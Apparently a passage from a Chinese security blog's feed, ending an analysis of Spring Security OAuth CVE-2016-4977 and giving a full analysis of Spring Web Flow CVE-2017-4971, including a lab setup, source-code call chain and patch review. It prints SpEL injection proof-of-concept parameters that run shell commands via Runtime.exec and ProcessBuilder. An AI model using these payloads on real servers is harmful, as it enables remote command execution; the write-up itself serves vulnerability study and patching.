class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到以下两个函数：</p><ul><li>在SpelView类的构造函数中，传参是赋值给了template属性即模板，helper属性是PropertyPlaceholderHelper类型、其中的两个传参分别是包括表达式字符串的前缀和后缀字符串，resolver属性是规定了如何解析这个错误信息、这里看到是定义了resolvePlaceholder()函数，该函数是将传参定义为Expression类型的表达式，再调用<code>expression.getValue(context)</code>，这就是SpEL表达式解析的地方，也是漏洞最后执行的地方。</li><li>在render()函数中，负责渲染页面，这里会调用replacePlaceholders()函数来使用resolver属性作为解析器、template属性作为模板进行页面的解析渲染。</li></ul><p>在前面的ModelAndView类的构造函数中使用SpelView类来渲染页面，必然会调用到render()函数，而该函数调用了replacePlaceholders()函数。我们跟进该函数看看，路径为：<a href="https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all placeholders of format &#123;<span class="doctag">@code</span> $&#123;name&#125;&#125; with the value returned</span></span><br><span class="line"><span class="comment"> * from the supplied &#123;<span class="doctag">@link</span> PlaceholderResolver&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value containing the placeholders to be replaced</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver the &#123;<span class="doctag">@code</span> PlaceholderResolver&#125; to use for replacement</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the supplied value with placeholders replaced inline</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> </span>&#123;</span><br><span class="line">Assert.notNull(value, <span class="string">"'value' must not be null"</span>);</span><br><span class="line"><span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">parseStringValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Recursive invocation, parsing placeholders contained in the placeholder key.</span></span><br><span class="line">placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders);</span><br><span class="line"><span class="comment">// Now obtain the value for the fully resolved key...</span></span><br><span class="line">String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br><span class="line">               ...</span><br></pre></td></tr></table></figure><p>看到replacePlaceholders()函数中是直接调用了parseStringValue()函数来进一步解析；在parseStringValue()函数中，递归调用了自身以获取前面SpelView类实例helper属性的前缀和后缀字符串括起来的内容并赋值给placeholder变量，接着就调用了SpelView类实例resolver属性的resolvePlaceholder()函数来解析这个placeholder变量值即我们输入的恶意SpEL表达式，从而在resolvePlaceholder()函数中调用了<code>expression.getValue(context)</code>导致SpEL表达式注入漏洞的触发。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看下2.0.10版本的补丁怎么打的：<a href="https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a</a></p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/3.png" alt=""></p><blockquote><p>可以看到在<strong>第一次执行表达式之前</strong>程序将<code>$</code>替换成了由<code>RandomValueStringGenerator().generate()</code>生成的随机字符串，也就是<code>${errorSummary} -&gt; random{errorSummary}</code>，但是这个替换不是递归的，所以<code>${2334-1}</code>并没有变。</p><p>然后创建了一个<code>helper</code>使程序取<code>random{}</code>中的内容作为表达式，这样就使得<code>errorSummary</code>被作为表达式执行了，而<code>${2334-1}</code>因为不符合<code>random{}</code>这个形式所以没有被当作表达式，从而也就没有办法被执行了。</p><p>不过这个Patch有一个缺点：<code>RandomValueStringGenerator</code>生成的字符串虽然内容随机，但长度固定为6，所以存在暴力破解的可能性。</p></blockquote><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.knownsec.com/2016/10/spring-security-oauth-rce/" target="_blank" rel="noopener">Spring Security OAuth RCE (CVE-2016-4977) 漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Web Flow之CVE-2017-4971</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-WebFlow%E4%B9%8BCVE-2017-4971/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/</id>
    <published>2020-02-09T04:12:36.000Z</published>
    <updated>2020-02-09T14:12:35.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Web-Flow"><a href="#0x01-Spring-Web-Flow" class="headerlink" title="0x01 Spring Web Flow"></a>0x01 Spring Web Flow</h2><p>Spring Web Flow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来，其最主要的目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题。</p><p>具体更多的简介可参考IBM的文章：<a href="https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html" target="_blank" rel="noopener">Spring Web Flow 2.0 入门</a></p><h2 id="0x02-CVE-2017-4971"><a href="#0x02-CVE-2017-4971" class="headerlink" title="0x02 CVE-2017-4971"></a>0x02 CVE-2017-4971</h2><p>在Spring Web Flow 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Web Flow 2.4.0 ~ 2.4.4</li><li>一些老的不再支持的版本也受影响</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulapps的环境（Vulhub的环境在下载时老不成功）：</p><p><a href="http://vulapps.evalbug.com/s_springwebflow_1/" target="_blank" rel="noopener">http://vulapps.evalbug.com/s_springwebflow_1/</a></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>在Web Flow配置文件中view-state节点中指定了model属性，并且没有指定绑定的参数，即view-state中没有配置binder节点；</li><li>MvcViewFactoryCreator类中useSpringBeanBinding默认值（false）未修改；</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先访问/login的接口登录进去，然后随便选择一家酒店点击Book来预订，最后点击Confirm确认，同时用Burp拦截这个Confirm报文，在POST的请求内容中添加如下PoC参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)</span><br><span class="line">或</span><br><span class="line">&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;touch /tmp/mi1k7ea&quot;)).start()</span><br></pre></td></tr></table></figure><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/1.png" alt=""></p><p>此时后台就能看到SpEL表达式注入漏洞被成功触发了：</p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，只从补丁处开始做简单的漏洞点分析。</p><p>代码路径：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java</a></p><p>漏洞点位于AbstractMvcView类的addEmptyValueMapping()函数，这里ExpressionParser.parseExpression()函数是用于执行传入的第一个参数field的SpEL表达式，即关键在于addEmptyValueMapping()函数第二个参数field是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Adds a special &#123;<span class="doctag">@link</span> DefaultMapping&#125; that results in setting the target field on the model to an empty value</span></span><br><span class="line"><span class="comment"> * (typically null).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mapper the mapper to add the mapping to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field the field for which a mapping is to be added</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addEmptyValueMapping</span><span class="params">(DefaultMapper mapper, String field, Object model)</span> </span>&#123;</span><br><span class="line">ParserContext parserContext = <span class="keyword">new</span> FluentParserContext().evaluate(model.getClass());</span><br><span class="line">Expression target = expressionParser.parseExpression(field, parserContext);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; propertyType = target.getValueType(model);</span><br><span class="line">Expression source = <span class="keyword">new</span> StaticExpression(getEmptyValue(propertyType));</span><br><span class="line">DefaultMapping mapping = <span class="keyword">new</span> DefaultMapping(source, target);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Adding empty value mapping for parameter '"</span> + field + <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">mapper.addMapping(mapping);</span><br><span class="line">&#125; <span class="keyword">catch</span> (EvaluationException e) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用addEmptyValueMapping()的函数有两个，都在AbstractMvcView类中，分别为addModelBindings()和addDefaultMappings()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addDefaultMappings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (String parameterName : parameterNames) &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterName.startsWith(fieldMarkerPrefix)) &#123;</span><br><span class="line">String field = parameterName.substring(fieldMarkerPrefix.length());</span><br><span class="line"><span class="keyword">if</span> (!parameterNames.contains(field)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, field, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addModelBindings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Binding binding : binderConfiguration.getBindings()) &#123;</span><br><span class="line">String parameterName = binding.getProperty();</span><br><span class="line"><span class="keyword">if</span> (parameterNames.contains(parameterName)) &#123;</span><br><span class="line">addMapping(mapper, binding, model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterNames.contains(fieldMarkerPrefix + parameterName)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这两个函数都调用了存在缺陷的函数，那么我们看看哪个函数才能实际控制field参数。</p><blockquote><p>这里比较明显的区别就是 addModelBindings 函数中 <code>for (Binding binding : binderConfiguration.getBindings())</code> 存在这样一个循环，而且就是这个循环的控制决定了 field 参数的值，经过进一步分析，这里控制 field 的参数的决定性因素就是 binderConfiguration 这个变量所控制的值，这里经过源码的跟踪我们可以发现，binderConfiguration 函数的值就是 webflow-*.xml 中 view-state 中 binder 节点的配置，所以这个函数的值来源于配置文件，所以这个函数我们无法控制，从而无法触发漏洞，所以我们重点来看看 addDefaultMappings 这个函数，我们发现 addDefaultMappings 中我们可以控制 field 参数，所以我们重点来看看如何去触发这个函数。</p></blockquote><p>而同文件中的bind()函数是根据binderConfiguration值是否为null来区分调用这两个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到当binderConfiguration值为null时才会调用漏洞函数addDefaultMappings()，这也是前提条件之一，在接下来会将原因。</p><p>最终，我们可以得到如下几个关键函数调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind()-&gt;addDefaultMappings()-&gt;addEmptyValueMapping()-&gt;parseExpression()</span><br></pre></td></tr></table></figure><h4 id="必须view-state中未配置binder节点的原因"><a href="#必须view-state中未配置binder节点的原因" class="headerlink" title="必须view-state中未配置binder节点的原因"></a>必须view-state中未配置binder节点的原因</h4><p>我们看到bind()函数的源码，在spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView类中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Causes the model to be populated from information contained in request parameters.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If a view has binding configuration then only model fields specified in the binding configuration will be</span></span><br><span class="line"><span class="comment"> * considered. In the absence of binding configuration all request parameters will be used to update matching fields</span></span><br><span class="line"><span class="comment"> * on the model.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model to be updated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an instance of MappingResults with information about the results of the binding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个if判断语句，条件是判断binderConfiguration是否为null。这里只有binderConfiguration为null时，才会进入后面调用存在漏洞的addDefaultMappings()函数的代码逻辑。而binderConfiguration的值是由配置文件中是否有binder节点来控制的。</p><p>看到spring-webflow/src/main/java/org/springframework/webflow/engine/model/builder/xml/XmlFlowModelBuilder类中相关的函数定义，其中parseState()函数用于解析节点，当判断到view-state节点后就调用parseViewState()函数作进一步解析处理，其中调用parseBinder()函数来获取binder字节的内容并设置到binder中，当不存在binder节点时直接返回null：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> AbstractStateModel <span class="title">parseState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DomUtils.nodeNameEquals(element, <span class="string">"view-state"</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> parseViewState(element);</span><br><span class="line">&#125;</span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ViewStateModel <span class="title">parseViewState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">ViewStateModel state = <span class="keyword">new</span> ViewStateModel(element.getAttribute(<span class="string">"id"</span>));</span><br><span class="line">...</span><br><span class="line">state.setBinder(parseBinder(element));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> BinderModel <span class="title">parseBinder</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">Element binderElement = DomUtils.getChildElementByTagName(element, <span class="string">"binder"</span>);</span><br><span class="line"><span class="keyword">if</span> (binderElement != <span class="keyword">null</span>) &#123;</span><br><span class="line">BinderModel binder = <span class="keyword">new</span> BinderModel();</span><br><span class="line">binder.setBindings(parseBindings(binderElement));</span><br><span class="line"><span class="keyword">return</span> binder;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中没找到binder节点后就会返回null，之后binderConfiguration的值就被设置为了null。</p><h4 id="必须useSpringBeanBinding默认值（false）未修改的原因"><a href="#必须useSpringBeanBinding默认值（false）未修改的原因" class="headerlink" title="必须useSpringBeanBinding默认值（false）未修改的原因"></a>必须useSpringBeanBinding默认值（false）未修改的原因</h4><p>为啥前提条件要useSpringBeanBinding为默认值false即未修改过？</p><p>查看spring-webflow/src/main/java/org/springframework/webflow/mvc/builder/MvcViewFactoryCreator类的createViewFactory()函数，看到如果useSpringBeanBinding这个属性为false则使用默认的解析类，如果这个值为true则使用BeanWrapperExpressionParser类来解析，而该类是无法执行SpEL表达式的（具体可看补丁分析）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ViewFactory <span class="title">createViewFactory</span><span class="params">(Expression viewId, ExpressionParser expressionParser,</span></span></span><br><span class="line"><span class="function"><span class="params">ConversionService conversionService, BinderConfiguration binderConfiguration,</span></span></span><br><span class="line"><span class="function"><span class="params">Validator validator, ValidationHintResolver validationHintResolver)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (useSpringBeanBinding) &#123;</span><br><span class="line">expressionParser = <span class="keyword">new</span> BeanWrapperExpressionParser(conversionService);</span><br><span class="line">&#125;</span><br><span class="line">AbstractMvcViewFactory viewFactory = createMvcViewFactory(viewId, expressionParser, conversionService,</span><br><span class="line">binderConfiguration);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(eventIdParameterName)) &#123;</span><br><span class="line">viewFactory.setEventIdParameterName(eventIdParameterName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(fieldMarkerPrefix)) &#123;</span><br><span class="line">viewFactory.setFieldMarkerPrefix(fieldMarkerPrefix);</span><br><span class="line">&#125;</span><br><span class="line">viewFactory.setValidator(validator);</span><br><span class="line">viewFactory.setValidationHintResolver(validationHintResolver);</span><br><span class="line"><span class="keyword">return</span> viewFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>查看官方在Spring Web Flow 2.4.5 版本中的补丁是怎么写的：<a href="https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795</a></p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/3.png" alt=""></p><p>直接将ExpressionParser设置为BeanWrapperExpressionParser对象的实例，默认是执行不了表达式的。</p><p>查看BeanWrapperExpressionParser的源码：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java</a></p><p>其中的parseExpression()函数是直接继承的spring-webflow/spring-binding/src/main/java/org/springframework/binding/expression/support/AbstractExpressionParser类的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// expression parser</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Expression <span class="title">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span> <span class="keyword">throws</span> ParserException </span>&#123;</span><br><span class="line">Assert.notNull(expressionString, <span class="string">"The expression string to parse is required"</span>);</span><br><span class="line"><span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">context = NullParserContext.INSTANCE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (context.isTemplate()) &#123;</span><br><span class="line"><span class="keyword">return</span> parseTemplate(expressionString, context);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (expressionString.startsWith(getExpressionPrefix()) &amp;&amp; expressionString.endsWith(getExpressionSuffix())) &#123;</span><br><span class="line"><span class="keyword">if</span> (!allowDelimitedEvalExpressions) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ParserException(</span><br><span class="line">expressionString,</span><br><span class="line"><span class="string">"The expression '"</span></span><br><span class="line">+ expressionString</span><br><span class="line">+ <span class="string">"' being parsed is expected be a standard OGNL expression. Do not attempt to enclose such expression strings in $&#123;&#125; delimiters--this is redundant. If you need to parse a template that mixes literal text with evaluatable blocks, set the 'template' parser context attribute to true."</span>,</span><br><span class="line"><span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> lastIndex = expressionString.length() - getExpressionSuffix().length();</span><br><span class="line">String ognlExpression = expressionString.substring(getExpressionPrefix().length(), lastIndex);</span><br><span class="line"><span class="keyword">return</span> doParseExpression(ognlExpression, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> doParseExpression(expressionString, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这里if判断条件的allowDelimitedEvalExpressions，这个默认值是false，因此默认是不能进入里面的代码逻辑、也就执行不了表达式了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://paper.seebug.org/322/" target="_blank" rel="noopener">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
